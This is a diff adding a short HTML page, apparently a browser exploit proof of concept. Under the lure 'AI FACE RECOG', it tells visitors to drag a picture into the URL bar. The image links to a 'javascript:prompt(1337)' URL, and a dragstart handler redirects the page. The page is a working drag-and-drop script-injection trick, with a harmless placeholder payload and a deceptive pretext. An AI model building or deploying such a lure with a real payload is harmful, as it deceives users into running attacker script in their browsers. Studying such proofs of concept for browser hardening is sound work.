@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="utf-8">
+    <style>
+        #drag { 
+        position: absolute;
+        left: 25%;
+        bottom: 5%;
+        font-size: 100px;
+        }
+    </style>
+
+</head>
+<body>
+    <h1>AI FACE RECOG</h1>
+    <p>drag & drop Picture to url bar</p>
+    <div id='drag' draggable="true">
+        <a href="javascript:prompt(1337);//"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSUs1QBInUhflBkthvrk4jkth0keLSO6tvQIo61p-O-Hw&s=10"></a>
+    </div>
+
+<script>
+
+
+document.onreadystatechange = () => {
+    if (document.readyState === 'complete') {
+        var x = document.getElementById("drag");
+ 
+            x.addEventListener("dragstart", function(ev){
+
+        location='https://www.google.com.com/'
+        });
+
+    }
+};
+</script>
+</body>
+</html>
